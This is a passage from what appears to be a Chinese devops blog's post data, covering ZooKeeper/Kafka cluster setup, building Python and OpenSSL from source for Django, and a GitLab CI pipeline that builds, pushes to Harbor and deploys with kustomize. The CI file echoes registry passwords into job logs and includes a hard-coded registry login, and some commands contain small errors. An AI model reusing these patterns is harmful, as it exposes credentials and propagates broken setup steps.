class=\"cl\"\u003e172.18.31.51\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e172.18.31.52\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e移动软件：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar zxvf zookeeper-3.4.14.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emv apache-zookeeper-3.6.3-bin /usr/local\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar zxvf kafka_2.13-3.2.0.tgz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emv kafka_2.13-3.2.0 /usr/local\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然后得装 java 了，centos 版本\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum -y install epel-release\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum -y install java-11-openjdk-devel\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e首先去编辑zookeeper的配置文件，然后启动\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecp /usr/local/apache-zookeeper-3.6.3-bin/conf/zoo_sample.cfg /usr/local/apache-zookeeper-3.6.3-bin/conf/zoo.cfg\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e编辑zoo.cfg，增加几行\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003edataDir\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/data/zookeeper\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emetricsProvider.className\u003cspan class=\"o\"\u003e=\u003c/span\u003eorg.apache.zookeeper.metrics.prometheus.PrometheusMetricsProvider\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emetricsProvider.httpPort\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e7000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emetricsProvider.exportJvmInfo\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eserver.0\u003cspan class=\"o\"\u003e=\u003c/span\u003e172.18.31.50:20881:30881\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eserver.1\u003cspan class=\"o\"\u003e=\u003c/span\u003e172.18.31.51:20881:30881\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eserver.2\u003cspan class=\"o\"\u003e=\u003c/span\u003e172.18.31.52:20881:30881\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e注意上面，我们的数据目录是在/data/zookeeper，所以要先建立好目录结构\u003c/p\u003e\n\u003cp\u003e然后有三台服务器么，把各自的id放到文件中，然后20881是三台服务器之间的通讯端口，30881是选举端口\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir /data/zookeeper -p\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"m\"\u003e0\u003c/span\u003e \u0026gt;/data/zookeeper/myid\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e三台服务器分别启动\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/usr/local/apache-zookeeper-3.6.3-bin/bin/zkServer.sh start\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e验证一下\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/usr/local/apache-zookeeper-3.6.3-bin/bin/zkCli.sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003ezk: localhost:2181\u003cspan class=\"o\"\u003e(\u003c/span\u003eCONNECTED\u003cspan class=\"o\"\u003e)\u003c/span\u003e 1\u003cspan class=\"o\"\u003e]\u003c/span\u003e ls /\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003eadmin, brokers, cluster, config, consumers, controller, controller_epoch, feature, isr_change_notification, latest_producer_id_block, log_dir_event_notification, zookeeper\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e看看 / 下有东西就行了，上面是已经装好了 kafka 和 cruisecontrol的情形，东西就比较多了\u003c/p\u003e","title":"Kafka的安装和验证"},{"content":"其实本身自己是比较喜欢 javascripts 的，但是 Python 也是必须掌握的一项技能。\n干 devops ansible 跟 python 也脱不了干系，所以准备用 django 开发一个自动上线的系统。\n先准备一下 Python 以及 Django 的环境好了。\n一、准备 Python 秘籍，不要用什么 venv 之类的东西，污染环境。直接下载源代码编译安装，然后把 py 封到自己的密闭是王道，最后引用一下 $PATH ，想用哪个就用哪个。\n注意以下的步骤，先装 gcc 的编译环境，然后装 openssl 的高版本，并且配置好 ldconfig，否则 py 的 ssl 会报错。\n最后下载 python 3.8.15 编译安装，生产环境，最好采用最新版本往后错两个版本。\n编译安装到 /export/servers/python3目录\nyum -y install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gcc make libffi-devel\rwget https://www.openssl.org/source/openssl-1.1.1q.tar.gz\r./config --prefix=/export/servers/openssl\rvi /etc/ld.so.conf\r/export/servers/openssl/lib\rldconfig -v\rwget https://www.python.org/ftp/python/3.8.15/Python-3.8.15.tgz\r./configure --prefix=/export/servers/python3 --with-openssl=/export/servers/openssl --with-ssl-default-suites=openssl 最后一步：\nexport $PATH=/export/servers/python3/bin:$PATH 这样就完成了 python 的安装\n二、配置Django 先升级一下pip到最新版本\n/export/servers/python3/bin/python3.8 -m pip install --upgrade pip\rpip3 install django\rpip3 install pysqlite3\rpip3 install pysqlite3-binary 为什么要这么搞，因为 django 要求 sqlite 的版本比较高，无法升级，干脆换掉它改成 pysqlite3 就好了\nvi /export/servers/python3/lib/python3.8/site-packages/django/db/backends/sqlite3/base.py\r#from sqlite3 import dbapi2 as Database\rfrom pysqlite3 import dbapi2 as Database 这样 django 的环境就搭好了\n","permalink":"https://rendoumi.com/posts/20221027-python_django/","summary":"\u003cp\u003e其实本身自己是比较喜欢 javascripts 的，但是 Python 也是必须掌握的一项技能。\u003c/p\u003e\n\u003cp\u003e干 devops ansible 跟 python 也脱不了干系，所以准备用 django 开发一个自动上线的系统。\u003c/p\u003e\n\u003cp\u003e先准备一下 Python 以及 Django 的环境好了。\u003c/p\u003e\n\u003ch4 id=\"一准备-python\"\u003e一、准备 Python\u003c/h4\u003e\n\u003cp\u003e秘籍，不要用什么 venv 之类的东西，污染环境。直接下载源代码编译安装，然后把 py 封到自己的密闭是王道，最后引用一下 $PATH ，想用哪个就用哪个。\u003c/p\u003e\n\u003cp\u003e注意以下的步骤，先装 gcc 的编译环境，然后装 openssl 的高版本，并且配置好 ldconfig，否则 py 的 ssl 会报错。\u003c/p\u003e\n\u003cp\u003e最后下载 python 3.8.15 编译安装，生产环境，最好采用最新版本往后错两个版本。\u003c/p\u003e\n\u003cp\u003e编译安装到 /export/servers/python3目录\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eyum -y install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gcc make libffi-devel\r\n\r\nwget https://www.openssl.org/source/openssl-1.1.1q.tar.gz\r\n./config --prefix=/export/servers/openssl\r\n\r\nvi /etc/ld.so.conf\r\n/export/servers/openssl/lib\r\nldconfig -v\r\n\r\nwget https://www.python.org/ftp/python/3.8.15/Python-3.8.15.tgz\r\n./configure --prefix=/export/servers/python3 --with-openssl=/export/servers/openssl --with-ssl-default-suites=openssl\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e最后一步：\u003c/p\u003e","title":"Python下Django环境的准备"},{"content":"Gitlab 和 Jenkins 一样，都是很流行的 CI/CD 工具，当然，本站之前推过国人自产的东西 onedev，那个也相当不错，但是用的人毕竟还是少，这回还是用大家都耳熟能详的东西。\n本篇就是 Giblab 在生产环境打包发布的一个全流程。\n解释一下上图：\n首先有两套Git，一套是程序员的Code仓库，另一套是运维的操作代码，里面是一些yaml啊，一些ansible脚本啊\n然后流程就是先取出程序员的Code，build出来jar，然后打成镜像推到仓库，然后再取出运维的代码，进行合并，生成k8s的yaml文件，最后推到 kubernetes 中去，这样整个 GitOPS 的流程就完备了\n在 gitlab 中非常简单，就是编辑 .gitlab-ci.yaml 文件\nimage: docker:19.03.12 variables: DOCKER_DRIVER: overlay2 DOCKER_TLS_CERTDIR: \u0026#34;\u0026#34; MAVEN_OPTS: \u0026#34;-Dmaven.repo.local=.m2/repository\u0026#34; TIMEZONE: \u0026#34;Asia/Shanghai\u0026#34; http_proxy: \u0026#34;\u0026#34; https_proxy: \u0026#34;\u0026#34; no_proxy: \u0026#34;\u0026#34; cache: paths: - .m2/repository/ - target/ stages: - build - push - deploy Build: stage: build image: maven:3.5-jdk-8-alpine before_script: - export COMMIT_TIME=$(TZ=CST-8 date +%F-%H-%M) - echo $COMMIT_TIME - echo \u0026#34;COMMIT_TIME=$COMMIT_TIME\u0026#34; \u0026gt;\u0026gt; build.env script: - ./mvnw package artifacts: reports: dotenv: build.env tags: - yunwei Push: stage: push before_script: - docker info || true - echo \u0026#34;$HARBOR_REGISTRY $HARBOR_USERNAME $HARBOR_PASSWORD\u0026#34; - echo \u0026#34;echo Dingfangwen | docker login 172.18.31.28 -u dingfangwen --password-stdin\u0026#34; - echo -n $HARBOR_PASSWORD | docker login $HARBOR_REGISTRY -u $HARBOR_USERNAME --password-stdin script: - docker pull $HARBOR_REGISTRY_IMAGE:latest || true - \u0026gt; docker build --cache-from $HARBOR_REGISTRY_IMAGE:latest --build-arg http_proxy=$http_proxy --build-arg https_proxy=$https_proxy --build-arg no_proxy=$no_proxy --cache-from HARBOR_REGISTRY_IMAGE:latest --tag $HARBOR_REGISTRY_IMAGE:$COMMIT_TIME --tag $HARBOR_REGISTRY_IMAGE:latest . - docker push $HARBOR_REGISTRY_IMAGE:$COMMIT_TIME - docker push $HARBOR_REGISTRY_IMAGE:latest - docker logout $HARBOR_REGISTRY dependencies: - Build tags: - yunwei Deploy: stage: deploy cache: {} image: cnych/kustomize:v1.0 script: - echo $COMMIT_TIME - git config --global user.email \u0026#34;gitlab@git.k8s.local\u0026#34; - git config --global user.name \u0026#34;GitLab CI/CD\u0026#34; - git clone git://172.18.31.50:30000/test-k8s.git - cd test-k8s/prod - kustomize edit set image $HARBOR_REGISTRY_IMAGE:$COMMIT_TIME - cat kustomization.yaml - git commit -am \u0026#39;PROD image update\u0026#39; - git push origin master dependencies: - Build tags: - yunwei only: - master when: manual 先不着急看这个文件，再普及一下 gitlab 的运行机制，它是通过 gitlab-runner 来执行cd的过程的。配置gitlab runner其实也是一项非常复杂的工作，里面可以配的东西太多了，不是本篇的范畴。我们这里简单来说，runner就是一个Docker容器。更准确的说，就是Docker in Docker。\n好，接下来一步步分析整个部署文件：\nimage: docker:19.03.12 variables: DOCKER_DRIVER: overlay2 DOCKER_TLS_CERTDIR: \u0026#34;\u0026#34; MAVEN_OPTS: \u0026#34;-Dmaven.repo.local=.m2/repository\u0026#34; TIMEZONE: \u0026#34;Asia/Shanghai\u0026#34; http_proxy: \u0026#34;\u0026#34; https_proxy: \u0026#34;\u0026#34; no_proxy: \u0026#34;\u0026#34; cache: paths: - .m2/repository/ - target/ 首先指定了 Build 过程使用的 Docker 容器的底版，是 docker:19.03.12，设置了 MAVEN_OPTS 的参数，这一点也非常重要，因为每次启动一个 Docker ，在容器里运行 mvn build 的时候，你不会想每次都重新下载所有的依赖包吧。\n下面的 cache 部分，设置了整个 build 过程中乃至以后，都保留中间产物。target 目录中存放的是 build 出来的 jar 包。\n继续，整个部署过程分三个步骤，1、build 出 jar 包，2、打包成镜像推到仓库去，3、最后发布到k8s去\nstages: - build - push - deploy 首先第一步，build jar包\nBuild: stage: build image: maven:3.5-jdk-8-alpine before_script: - export COMMIT_TIME=$(TZ=CST-8 date +%F-%H-%M) - echo $COMMIT_TIME - echo \u0026#34;COMMIT_TIME=$COMMIT_TIME\u0026#34; \u0026gt;\u0026gt; build.env script: - ./mvnw package artifacts: reports: dotenv: build.env tags: - yunwei 很简单，其实就是又起了一个容器，底版是maven:3.5-jdk-8-alpine，在容器里执行了一条命令， mvnw package，这条命令如果成功执行，会在当前目录下新建一个 target 目录，生成一个jar包。\n上面比较莫名的地方是这个镜像吧，居然不支持 date +%Y-%m-%d 方式，所以八戒查了半天，用了一个巨别扭的命令生成了时间戳，然后呢把这个时间戳放到一个build.env文件里，然后通过 artifacts 产物，把这个文件以环境变量的方式传到随后的 docker 容器里，这样就可以在随后的容器里用环境变量引用这个一开始就生成的时间戳了。\n第二步，生成镜像并push到自己的harbor镜像仓库中去\n注意，程序员的源代码里是有 Dockerfile 这个文件的\nPush: stage: push before_script: - docker info || true - echo \u0026#34;$HARBOR_REGISTRY $HARBOR_USERNAME $HARBOR_PASSWORD\u0026#34; - echo \u0026#34;echo Dingfangwen | docker login 172.18.31.28 -u dingfangwen --password-stdin\u0026#34; - echo -n $HARBOR_PASSWORD | docker login $HARBOR_REGISTRY -u $HARBOR_USERNAME --password-stdin script: - docker pull $HARBOR_REGISTRY_IMAGE:latest || true - \u0026gt; docker build --cache-from $HARBOR_REGISTRY_IMAGE:latest --build-arg http_proxy=$http_proxy --build-arg https_proxy=$https_proxy --build-arg no_proxy=$no_proxy --cache-from HARBOR_REGISTRY_IMAGE:latest --tag $HARBOR_REGISTRY_IMAGE:$COMMIT_TIME --tag $HARBOR_REGISTRY_IMAGE:latest . - docker push $HARBOR_REGISTRY_IMAGE:$COMMIT_TIME - docker push $HARBOR_REGISTRY_IMAGE:latest - docker logout $HARBOR_REGISTRY dependencies: - Build tags: - yunwei 上面就是在docker容器里build一个镜像并推到我们的私有harbor仓库172.18.31.28去，这个仓库是需要登录验证的。\n然后 docker build 的时候又有一些技巧，docker 本身文件是分层的，\u0026ndash;cache-from 可以加快 build 的过程\n同样我们看到直接引用 $COMMIT_TIME 就可以引用第一步生成的时间戳，注意我们推了两遍，保留了历史时间戳版本，和最新版本。\n给出 Dockerfile 的内容：\nFROM openjdk:8-jre-alpine\rENV LANG C.UTF-8 ENV LANGUAGE C.UTF-8\rENV LC_ALL C.UTF-8\rEXPOSE 8080\rWORKDIR /apps\rCOPY target/spring-petclinic-2.4.5.jar /apps/app.jar\rRUN echo \u0026#34;Asia/Shanghai\u0026#34; \u0026gt; /etc/timezone\rENTRYPOINT [\u0026#34;java\u0026#34;,\u0026#34;-jar\u0026#34;,\u0026#34;/apps/app.jar\u0026#34;] 最后一步的发布过程：\nDeploy: stage: deploy cache: {} image: cnych/kustomize:v1.0 script: - echo $COMMIT_TIME - git config --global user.email \u0026#34;gitlab@git.k8s.local\u0026#34; - git config --global user.name \u0026#34;GitLab CI/CD\u0026#34; - git clone git://172.18.31.50:30000/test-k8s.git - cd test-k8s/prod - kustomize edit set image $HARBOR_REGISTRY_IMAGE:$COMMIT_TIME - cat kustomization.yaml - git commit -am \u0026#39;PROD image update\u0026#39; - git push origin master dependencies: - Build tags: - yunwei only: - master when: manual 这个就没什么说的了，用kustomize的底版，git下载yaml的模板文件，然后用 kustomize 定制化，最后push到git里面去，做好版本记录。然后kubectl apply -f *.yaml的步骤没有做，大家可以自己加上就没有问题了。\nover，这就是一个生产的实际例子。\n","permalink":"https://rendoumi.com/posts/20221025-gitlab_cicd/","summary":"\u003cp\u003eGitlab 和 Jenkins 一样，都是很流行的 CI/CD 工具，当然，本站之前推过国人自产的东西 onedev，那个也相当不错，但是用的人毕竟还是少，这回还是用大家都耳熟能详的东西。\u003c/p\u003e\n\u003cp\u003e本篇就是 Giblab 在生产环境打包发布的一个全流程。\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"1666673866024\" loading=\"lazy\" src=\"/posts/20221025-gitlab_cicd/1666673866024.png\"\u003e\u003c/p\u003e\n\u003cp\u003e解释一下上图：\u003c/p\u003e\n\u003cp\u003e首先有两套Git，一套是程序员的Code仓库，另一套是运维的操作代码，里面是一些yaml啊，一些ansible脚本啊\u003c/p\u003e\n\u003cp\u003e然后流程就是先取出程序员的Code，build出来jar，然后打成镜像推到仓库，然后再取出运维的代码，进行合并，生成k8s的yaml文件，最后推到 kubernetes 中去，这样整个 GitOPS 的流程就完备了\u003c/p\u003e\n\u003cp\u003e在 gitlab 中非常简单，就是编辑 .gitlab-ci.yaml 文件\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003eimage\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003edocker:19.03.12\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003evariables\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003eDOCKER_DRIVER\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eoverlay2\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003eDOCKER_TLS_CERTDIR\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003eMAVEN_OPTS\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;-Dmaven.repo.local=.m2/repository\u0026#34;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003eTIMEZONE\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Asia/Shanghai\u0026#34;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003ehttp_proxy\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003ehttps_proxy\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003eno_proxy\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003ecache\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003epaths\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003e.m2/repository/\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003etarget/\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003estages\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e- \u003cspan class=\"l\"\u003ebuild\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e- \u003cspan class=\"l\"\u003epush\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e- \u003cspan class=\"l\"\u003edeploy\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003eBuild\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003estage\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ebuild\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003eimage\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003emaven:3.5-jdk-8-alpine\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003ebefore_script\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003eexport COMMIT_TIME=$(TZ=CST-8 date +%F-%H-%M)\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003eecho $COMMIT_TIME\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003eecho \u0026#34;COMMIT_TIME=$COMMIT_TIME\u0026#34; \u0026gt;\u0026gt; build.env\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003escript\u003c/span\u003e\u003cspan 